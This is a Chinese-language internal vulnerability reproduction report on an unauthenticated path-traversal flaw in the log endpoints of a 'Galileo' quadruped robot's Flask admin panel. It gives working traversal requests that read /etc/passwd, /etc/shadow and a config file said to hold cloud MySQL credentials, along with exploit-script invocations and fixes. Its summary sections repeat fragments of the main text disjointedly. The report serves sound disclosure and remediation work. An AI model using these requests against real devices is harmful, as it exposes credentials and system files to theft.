---
编号: GAL-021
验证状态: 动态确认
严重程度: 高
披露状态: 内部研究
源平台: 伽利略
源候选目录: 日志接口路径穿越任意文件下载-1
---
# GAL-021 伽利略（Galileo）机器人 日志接口路径穿越任意文件下载 漏洞复现报告

## 1. 一句话结论

- # 伽利略（Galileo）机器人 日志接口路径穿越任意文件下载 漏洞复现报告
- \| 漏洞类型 \| 路径穿越 → 任意目录列举 + 任意文件下载 \|
- \| 权限 \| galileo 可读的任意文件（服务进程身份） \|
- ## 1. 漏洞概述
- Flask 管理后台的日志接口未授权，且**对 dir/file 参数无任何路径穿越校验**：

## 2. 影响产品与版本

- \| 目标设备 \| 伽利略（Galileo）四足机器人（SSID `C1W-1.0-007`） \|
- \| 漏洞组件 \| Flask 管理后台 `/list_logs_in_dir`、`/download_log` 接口（5000 端口） \|
- \| 权限 \| galileo 可读的任意文件（服务进程身份） \|
- \| 授权边界 \| 仅对自有设备、隔离环境进行 \|
- **前任测试日志佐证（固件 operation.log）**：2026-08-28 09:05:18 记录

## 3. 验证状态

`动态确认`。该状态来自源报告的验证边界；迁移过程不把目录名称自动视为动态确认。

## 4. 攻击前提

攻击前提以脱敏研究正文为准；复现必须使用自有设备、隔离网络和授权环境，不得对第三方设备执行写入、控制或破坏性操作。

## 5. 根本原因

- # 伽利略（Galileo）机器人 日志接口路径穿越任意文件下载 漏洞复现报告
- \| 漏洞类型 \| 路径穿越 → 任意目录列举 + 任意文件下载 \|
- Flask 管理后台的日志接口未授权，且**对 dir/file 参数无任何路径穿越校验**：
- 3. 后台整体加认证（同其他漏洞根因）。

## 6. 攻击过程

源报告描述的入口、协议和利用顺序见第 13 节脱敏正文；本目录只保留最小复现材料，不复制原始大型证据。

## 7. 实际影响

- 后端逻辑（反编译还原）：`os.path.join(LOG_ROOT, dir, file)` 后仅做存在性检查，
- 跳出 `LOG_ROOT=/home/galileo/galileo_robot_global/logs`，实现**任意目录列举 +
- │     → os.path.join 后无校验，../ 跳出 LOG_ROOT
- get_log_file_path: log_path = join(LOG_ROOT, dir, file)
- ## 5. 影响范围
- 1. dir/file 参数规范化后强制限制在 LOG_ROOT 内

## 8. 复现方法

复现材料见 [复现材料清单](复现/材料清单.md)。导入脚本已做文本脱敏；未导入的原始脚本、日志、抓包和二进制见根目录材料清单。

## 9. 支撑证据

见 [证据材料清单](证据/材料清单.md) 和本页第 13 节。来源文件只登记哈希和本地保管路径，不把原始敏感材料带入 Git。

## 10. 修复建议

- 对入口实施身份认证、细粒度授权、消息完整性校验和重放防护；
- 对路径、长度、协议字段、文件类型和状态转换使用允许列表；
- 删除硬编码凭据并轮换已暴露材料；
- 对高风险服务降权，增加审计日志和负向回归测试。

## 11. 相关 AI 会话

当前未发现与该报告一一对应的完整 Claude Code 会话记录；如后续补齐，将在 [AI 会话索引](../../../../../AI轨迹/会话索引.md) 中登记。

## 12. 披露记录

- 当前披露状态：内部研究。
- 对外披露前必须重新审查凭据、设备标识、证据和厂商协调状态。

## 13. 脱敏后的原始研究正文

# 伽利略（Galileo）机器人 日志接口路径穿越任意文件下载 漏洞复现报告

| 项 | 值 |
|---|---|
| 目标设备 | 伽利略（Galileo）四足机器人（SSID `C1W-1.0-007`） |
| 系统 | Ubuntu 22.04 |
| 漏洞组件 | Flask 管理后台 `/list_logs_in_dir`、`/download_log` 接口（5000 端口） |
| 漏洞类型 | 路径穿越 → 任意目录列举 + 任意文件下载 |
| 权限 | galileo 可读的任意文件（服务进程身份） |
| 复现日期 | 2026-08-29（实机验证通过） |
| 授权边界 | 仅对自有设备、隔离环境进行 |

---

## 1. 漏洞概述

Flask 管理后台的日志接口未授权，且**对 dir/file 参数无任何路径穿越校验**：

```
GET /list_logs_in_dir?dir=../../../../etc        → 列出 /etc 目录全部文件
GET /download_log?dir=robot_startup&file=../../../../../etc/passwd
                                                  → 下载任意绝对路径文件
```

后端逻辑（反编译还原）：`os.path.join(LOG_ROOT, dir, file)` 后仅做存在性检查，
没有 `abspath/resolve/startswith` 等任何规范化与根目录限制——`../` 序列可完全
跳出 `LOG_ROOT=/home/galileo/galileo_robot_global/logs`，实现**任意目录列举 +
任意文件读取下载**。

实测：`file=../../../../../etc/passwd` 返回 200，完整下载了 `/etc/passwd`
（1678 字节，31 个账号条目）；`dir=../../../../etc` 列出了 /etc 全目录。

**前任测试日志佐证（固件 operation.log）**：2026-08-28 09:05:18 记录
`下载日志 | ../../../../../etc/shadow`（IP 192.168.2.167）—— **/etc/shadow
同样可穿越下载**（比 passwd 更敏感，含密码哈希）。

## 2. 攻击链

```
攻击者（同 WiFi）
   │  GET :5000/list_logs_in_dir?dir=../../../../etc      （未授权 + 穿越）
   │     → 枚举 /etc（或任意目录）
   ▼
GET :5000/download_log?dir=robot_startup&file=../../../../../etc/<文件>
   │     → os.path.join 后无校验，../ 跳出 LOG_ROOT
   ▼
任意 galileo 可读文件被完整下载（配置/源码/密钥/日志/凭据）
```

## 3. 漏洞细节

### 3.1 反编译证据（`utils/file_utils.py` 常量池）

```
list_logs_in_directory: "No dir specified" → "Dir not found"(target_dir)
    → listdir 遍历 → getmtime 排序返回
get_log_file_path: log_path = join(LOG_ROOT, dir, file)
download_log → send_file(log_path, as_attachment=True)
```

常量池中**不存在** `abspath/realpath/resolve/normpath/startswith` 等任何
路径校验调用 —— join 后直接使用。

### 3.2 实测穿越深度

- `dir` 参数：`../../../../etc`（4 层）即到 `/etc`（列表成功）；
- `file` 参数（默认 `dir=robot_startup` 再下钻一层）：需 5 层 `../`，
  `../../../../../etc/passwd` → 200，1678 字节。

### 3.3 接口未授权

同后台全部接口（见 Flask RCE 报告），无任何认证。

## 4. 复现

```bash
# 任意文件下载（回显）
python exploit.py /etc/passwd
python exploit.py /home/galileo/galileo-web-manger/opt/conf/web_config.json   # 含云端 MySQL 凭据

# 任意目录列举
python exploit.py --list ../../../../etc
```

## 5. 影响范围

- 未授权读取机器人上任意 galileo 可读文件：
  - `/home/galileo/galileo-web-manger/opt/conf/web_config.json`（**云端 MySQL 凭据**）
  - 应用源码/配置（pyc、env、launch 脚本）
  - 全部业务日志（含操作日志中的敏感信息）
  - `/etc/passwd` 等系统文件
- 为进一步攻击提供完整情报（凭据、配置、代码逻辑）。

## 6. 修复建议

1. dir/file 参数规范化后强制限制在 LOG_ROOT 内
   （`os.path.realpath` + `startswith(LOG_ROOT)` 校验）；
2. dir 采用白名单（仅允许 list_log_dirs 返回的目录名）；
3. 后台整体加认证（同其他漏洞根因）。

## 7. 证据

- `evidence/etc_passwd_downloaded.txt`：穿越下载的 /etc/passwd（31 条账号）
- `evidence/etc_dir_listing.json`：/etc 目录列表
